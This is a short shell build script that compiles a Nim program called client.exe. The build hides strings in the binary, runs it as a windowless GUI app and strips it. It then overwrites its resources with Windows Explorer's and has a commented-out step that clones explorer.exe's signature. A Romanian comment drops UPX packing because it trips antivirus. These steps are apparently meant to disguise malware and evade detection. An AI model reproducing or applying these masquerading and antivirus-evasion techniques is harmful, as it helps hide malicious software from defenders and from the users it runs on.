echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo COMPILING IN PRODUCTION MODE
echo DOUBLE CHECK FLAGS.NIM 
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!

#sleep 10

# generate client.exe
nim -f c --cpu:i386 -t:-m32 -l:-m32 --import:"$PWD\src\lib\functions\hideString.nim" -d:isProd=true -d:release -d:danger -d:strip --opt:size --app:gui --passc=-flto --passl=-flto -o:./dist/client.exe ./src/client.nim
strip -s ./dist/client.exe
# ./utils/upx.exe ./dist/client.exe # upx face antivirusii sa innebuneasca, il dezactivez momentan
./utils/rh.exe -open ./dist/client.exe -save ./dist/client.exe -action addoverwrite -res ./utils/explorer.res
# python ./utils/sig.py -i C:\\Windows\\explorer.exe -t ./dist/client.exe -o ./dist/client_signed.exe
